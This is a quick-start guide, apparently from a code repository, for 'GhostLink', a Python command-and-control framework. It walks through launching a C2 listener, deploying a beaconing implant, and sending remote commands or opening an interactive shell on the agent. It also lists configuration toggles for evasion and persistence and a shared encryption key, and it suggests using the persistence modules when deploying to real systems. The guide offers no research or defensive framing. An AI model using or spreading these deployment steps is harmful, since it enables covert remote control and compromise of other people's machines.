# GhostLink v1.0 - Quick Start Guide

## Prerequisites

- Python 3.7+
- pip package manager
- Git (for cloning)

## Installation Steps

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/ghostlink.git
cd ghostlink
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

**Note:** On Windows, `pywin32` will be installed automatically for Windows-specific features.

### 3. Verify Installation

```bash
python3 -c "from flask import Flask; from cryptography.fernet import Fernet; print('✓ Dependencies installed successfully')"
```

---

## Running the Framework

### Method 1: Manual Setup (Recommended for Development)

#### Terminal 1 - Start C2 Server

```bash
cd GhostLink
python3 Listener.py
```

**Expected Output:**
```
[+] Database initialized: ghostlink.db
[*] GhostLink C2 Server Starting on 0.0.0.0:8888...
[*] Endpoints:
    - POST /beacon (Agent beaconing)
    - POST /result (Receive command results)
    - GET  /agents (List agents)
    - POST /send_command (Queue command)
 * Serving Flask app 'Listener'
 * Debug mode: off
 * Running on http://0.0.0.0:8888
```

#### Terminal 2 - Deploy Agent

```bash
cd GhostLink
python3 Implant.py
```

**Expected Output:**
```
[*] GhostLink Agent Started
[*] C2 Server: http://127.0.0.1:8888
[*] Agent ID: Agent_01
[*] Beacon Interval: 10 seconds
[*] Starting beacon loop...
```

#### Terminal 3 - Send Commands

```bash
python3 << 'EOF'
import requests
import json

# Send command to agent
response = requests.post(
    'http://localhost:8888/send_command',
    json={
        'agent_id': 'Agent_01',
        'command': 'whoami'
    }
)
print(f"Status: {response.status_code}")
print(f"Response: {response.json()}")
EOF
```

#### Terminal 4 - View Results

```bash
sqlite3 ghostlink.db "SELECT command, result, status FROM commands ORDER BY timestamp DESC LIMIT 5;"
```

---

### Method 2: Using the Controller (Interactive CLI)

After starting Listener and Implant, in a new terminal:

```bash
python3 Controller.py
```

**Commands:**
```
GhostLink> agents                          # List all agents
GhostLink> send Agent_01 "whoami"         # Send command
GhostLink> interact Agent_01              # Interactive shell mode
GhostLink> exit                           # Exit controller
```

---

## Configuration

### Edit Server Settings (Listener.py)

```python
HOST = "0.0.0.0"              # Listening address
PORT = 8888                   # Port (change if needed)
DEBUG = False                 # Debug mode (False for production)
```

### Edit Agent Settings (Implant.py)

```python
C2_SERVER = "http://127.0.0.1:8888"     # Change to your server IP
BEACON_INTERVAL = 10                     # Beacon every X seconds
ENCODING_SCHEME = "chain"                # Encoding type
USE_MULTILAYER_ENCODING = True           # Enable multi-layer
ENABLE_EVASION = True                    # Enable evasion techniques
ENABLE_PERSISTENCE = False               # Enable persistence (if needed)
```

---

## Verification Checklist

- [ ] Dependencies installed (`pip install -r requirements.txt`)
- [ ] Server started (`python3 Listener.py`)
- [ ] Agent deployed (`python3 Implant.py`)
- [ ] Server shows agent connected
- [ ] Command executed successfully
- [ ] Results visible in database

---

## Troubleshooting

### Port Already in Use

**Error:** `Address already in use`

**Solution:**
```bash
# Find process using port 8888
lsof -i :8888

# Kill process (replace PID with actual process ID)
kill -9 <PID>

# Or change port in Listener.py
PORT = 9999
```

### Encryption Key Error

**Error:** `Fernet key invalid`

**Solution:**
Both Listener.py and Implant.py must have the same encryption key:
```python
ENCRYPTION_KEY = b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ="
```

### Agent Not Connecting

**Error:** Agent doesn't show in `/agents` endpoint

**Solution:**
1. Check if C2_SERVER in Implant.py matches server address
2. Verify server is running (`lsof -i :8888`)
3. Check firewall settings
4. Ensure same network or proper routing

### Database Lock Error

**Error:** `database is locked`

**Solution:**
```bash
# Remove old database
rm ghostlink.db

# Server will recreate it on startup
python3 Listener.py
```

---

## Directory Structure

```
GhostLink/
├── Listener.py              # C2 Server (Flask REST API)
├── Implant.py               # Agent/Beacon Module
├── Controller.py            # CLI Controller
├── utils.py                 # Utilities & Encoding
├── encoding.py              # Advanced Multi-Layer Encoding
├── persistence.py           # Persistence Mechanisms
├── advanced.py              # Advanced Features
├── loader.py                # Multi-Stage Loading
├── requirements.txt         # Python Dependencies
├── README.md                # Full Documentation
├── QUICKSTART.md            # This File
├── ENCODING_GUIDE.md        # Encoding Configuration
├── ENHANCEMENTS.md          # Features List
├── .gitignore               # Git Ignore Rules
└── ghostlink.db             # SQLite Database (auto-created)
```

---

## Testing

### Test Encoding

```bash
python3 verify_encoding.py
```

### Test Commands

```bash
python3 test_commands.py
```

---

## Documentation

For detailed information, see:

- **[README.md](README.md)** - Full project overview
- **[ENCODING_GUIDE.md](ENCODING_GUIDE.md)** - Encoding schemes and configuration
- **[ENHANCEMENTS.md](ENHANCEMENTS.md)** - List of features
- **[IMPLEMENTATION.md](IMPLEMENTATION.md)** - Technical details

---

## Security Notes

1. **Encryption Key:** The default key is for testing only. Generate your own for production:
   ```python
   from cryptography.fernet import Fernet
   key = Fernet.generate_key()
   print(key)
   ```

2. **HTTPS/TLS:** Implement HTTPS for production deployment

3. **Firewall:** Restrict access to C2 server on port 8888

4. **Logs:** Production environments should not write debug logs to stdout

5. **Database:** Secure the `ghostlink.db` file (contains command history)

---

## Common Issues

| Issue | Solution |
|-------|----------|
| `ModuleNotFoundError: No module named 'flask'` | Run `pip install -r requirements.txt` |
| Agent doesn't beacon | Check C2_SERVER IP in Implant.py |
| Database locked | Close other connections or delete `.db` file |
| Port in use | Change PORT in Listener.py or kill process |
| No commands executing | Verify encryption keys match |

---

## Next Steps

1. **Test locally first** with both agent and server on same machine
2. **Understand the encryption** by reading ENCODING_GUIDE.md
3. **Explore persistence modules** if deploying to real systems
4. **Modify configuration** for your specific needs
5. **Read IMPLEMENTATION.md** for technical deep dive

---

## Support

For issues, questions, or contributions:
- Check [ENHANCEMENTS.md](ENHANCEMENTS.md) for feature list
- Review [IMPLEMENTATION.md](IMPLEMENTATION.md) for technical details
- Check GitHub Issues section

---

**Status:** Production Ready ✓  
**Last Updated:** January 9, 2026  
**Version:** 1.0
